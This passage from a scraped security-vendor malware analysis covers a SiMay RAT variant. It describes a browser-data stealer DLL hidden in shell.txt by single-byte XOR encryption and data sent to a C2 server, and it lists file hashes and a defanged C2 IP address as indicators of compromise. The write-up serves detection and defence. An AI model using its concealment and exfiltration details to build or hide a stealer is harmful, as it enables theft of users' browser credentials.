+                    "html": "<p>The shell.txt contains shell code to import modules and a PE file (encrypted) where each byte is XORed by 25h. Further, the decrypted PE file had the original DLL name as server.dll. It also had multiple strings related to different browser names and their paths for user data this dll acts as a stealer for the RAT.</p>"
+                },
+                {
+                    "id": "<sentence_0x4343aa>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x15ee1194>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure15-1.png"
+                    },
+                    "text": "Figure 15: Suspicious strings in the Encrypted shell.txt file",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24073\"><img alt=\"\" class=\"size-full wp-image-24073\" height=\"347\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure15-1.png\" width=\"729\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24073\">Figure 15: Suspicious strings in the Encrypted shell.txt file</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0x40c036b8>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "This PE file will then be loaded into the memory space of the payload process and does the stealer activity when the attacker commands. The stolen data is then sent to the C2 server by the payload.",
+                    "html": "<p>This PE file will then be loaded into the memory space of the payload process and does the stealer activity when the attacker commands. The stolen data is then sent to the C2 server by the payload.</p>"
+                },
+                {
+                    "id": "<sentence_0xaa90765>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x6cd6c2ac>": "https://labs.k7computing.com/wp-content/uploads/2022/05/Figure16.png"
+                    },
+                    "text": "Figure 16: Payload contacting C2",
+                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_24074\"><img alt=\"\" class=\"size-full wp-image-24074\" height=\"83\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/05/Figure16.png\" width=\"579\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-24074\">Figure 16: Payload contacting C2</figcaption></figure>"
+                },
+                {
+                    "id": "<sentence_0x53aab43b>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "We at K7 Labs provide detection against latest threats and also for this newer variant of SiMay RAT. Users are advised to use a reliable security product such as K7 Total Security and keep it up-to-date so as to safeguard their devices.",
+                    "html": "<p>We at K7 Labs provide detection against latest threats and also for this newer variant of SiMay RAT. Users are advised to use a reliable security product such as \u201cK7 Total Security\u201d and keep it up-to-date so as to safeguard their devices.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xb84618d0>",
+            "title": "Indicators of Compromise(IOC)",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0x5559f092>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<table_0x92f6e1eb>": {
+                            "0": {
+                                "0": "File Name",
+                                "1": "b.exe (Initial Loader)",
+                                "2": "GLUT32.dll (RAT)"
+                            },
+                            "1": {
+                                "0": "Hash",
+                                "1": "A641B3B81153936C6A3D3D99FE8D9736",
+                                "2": "93FA023228112729F86015727346D1F8"
+                            },
+                            "2": {
+                                "0": "K7 Detection Name",
+                                "1": "Trojan ( 00590abd1 )",
+                                "2": "Adware ( 00506e8d1 )"
+                            }
+                        }
+                    },
+                    "text": "",
+                    "html": "<table>\n<tbody>\n<tr>\n<td>File Name</td>\n<td>Hash</td>\n<td>K7 Detection Name</td>\n</tr>\n<tr>\n<td>b.exe (Initial Loader)</td>\n<td>A641B3B81153936C6A3D3D99FE8D9736</td>\n<td>Trojan ( 00590abd1 )</td>\n</tr>\n<tr>\n<td>GLUT32.dll (RAT)</td>\n<td>93FA023228112729F86015727346D1F8</td>\n<td>Adware ( 00506e8d1 )</td>\n</tr>\n</tbody>\n</table>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x5c1e1d51>",
+            "title": "C2 :",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0xbc4ea9f7>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "202.8.121[.]28",
+                    "html": "<p>202.8.121[.]28</p>"
+                },
+                {
+                    "id": "<sentence_0x16ea345a>",
+                    "is_empty": true,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "",
+                    "html": "<p> </p>"
+                },
+                {
+                    "id": "<sentence_0x9a9adf5a>",
+                    "is_empty": true,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "",
+                    "html": "<p> </p>"
+                },
+                {
+                    "id": "<sentence_0x40f4be04>",
+                    "is_empty": true,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "",
+                    "html": "<p></p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x8c7d3284>",
+            "title": "Like what you're reading? Subscribe to our top stories.",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0x16548c37>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "If you want to subscribe to our monthly newsletter, please submit the form below.",
+                    "html": "<p class=\"sendgrid_widget_text\">If you want to subscribe to our monthly newsletter, please submit the form below.</p>"
+                },
+                {
+                    "id": "<sentence_0xd849336b>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Email* :",
+                    "html": " Email* : \n"
+                },
+                {
+                    "id": "<sentence_0x340fb54b>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xf7806e28>": "https://labs.k7computing.com/index.php/steer-clear-of-instant-loan-apps/"
+                    },
+                    "text": "Previous Post Steer Clear of Instant Loan Apps<crlf>Next Post",
+                    "html": "<ul class=\"controls\">\n<li class=\"previous-post mouse-leaving\">\n<h3>Previous Post\u00ab <a href=\"https://labs.k7computing.com/index.php/steer-clear-of-instant-loan-apps/\" rel=\"prev\">Steer Clear of Instant Loan Apps</a>\n</h3>\n</li>\n<li class=\"next-post mouse-leaving\">\n<h3>Next Post\n</h3>\n</li>\n</ul>"
+                }
+            ]
+        }
+    ]
+}
